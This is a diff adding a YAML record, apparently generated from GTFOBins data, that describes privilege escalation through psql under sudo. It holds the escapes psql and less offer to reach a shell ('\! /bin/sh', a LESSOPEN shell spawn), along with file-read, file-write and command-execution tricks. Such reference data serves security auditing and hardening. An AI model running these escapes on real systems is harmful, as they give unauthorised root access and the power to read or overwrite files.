@@ -1,0 +1,169 @@
+id: gtfobins/psql/inherit/sudo
+type: binary
+platform: linux
+name: psql
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- command-execution
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: 'psql
+
+    \?'
+references:
+- https://gtfobins.github.io/gtfobins/psql/
+- https://gtfobins.github.io/gtfobins/less/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        psql:
+          comment: A valid PostgreSQL server must be available to connect to.
+          functions:
+            inherit:
+            - code: 'psql
+
+                \?'
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              from: less
+            shell:
+            - code: 'psql
+
+                \! /bin/sh'
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+        less:
+          functions:
+            command:
+            - code: 'cp /path/to/command ~/.lessfilter
+
+                less /etc/hosts'
+              contexts:
+                unprivileged: null
+            - code: 'LESSOPEN=''/path/to/command # %s'' less /etc/hosts'
+              contexts:
+                sudo: null
+                unprivileged: null
+            file-read:
+            - code: less /path/to/input-file
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            - code: 'less /etc/hosts
+
+                :e /path/to/input-file'
+              comment: This can be used to read another file, e.g., when invoked as a pager with some
+                fixed content.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            - code: 'LESSOPEN=''echo /path/to/input-file # %s'' less /etc/hosts'
+              comment: This can be used to read another file.
+              contexts:
+                sudo: null
+                unprivileged: null
+            file-write:
+            - code: 'echo DATA | less
+
+                s/path/to/output-file
+
+                q'
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            inherit:
+            - code: 'less /etc/hosts
+
+                v'
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              from: vi
+            shell:
+            - code: 'less /etc/hosts
+
+                !/bin/sh'
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+            - code: 'LESSOPEN="/bin/sh -s 1>&0 2>&0 # %s" less /etc/hosts
+
+                reset'
+              comment: The optional `reset` command is needed to receive the echo back of the typed keystrokes.
+              contexts:
+                sudo: null
+                unprivileged: null
+            - code: 'VISUAL=''/bin/sh -s --'' less /etc/hosts
+
+                v'
+              contexts:
+                sudo: null
+                unprivileged: null
+    upstream_url: https://gtfobins.github.io/gtfobins/psql/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: heuristic
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+      note: Upstream inherit activation snippet; no downstream capability is inferred from its target.
+    confidence:
+      level: low
+  phases:
+  - value: execution
+    provenance:
+      type: heuristic
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+      note: Upstream inherit activation snippet; no downstream capability is inferred from its target.
+    confidence:
+      level: low
+  - value: privilege-escalation
+    provenance:
+      type: heuristic
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+      note: Upstream inherit activation snippet; no downstream capability is inferred from its target.
+    confidence:
+      level: low
+  privilege_required:
+    value: sudo
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:9bf9f14c5e83f72d0a8144a0f4fcdd3b977a2eb488a27f64e883cdbab7aeaf57
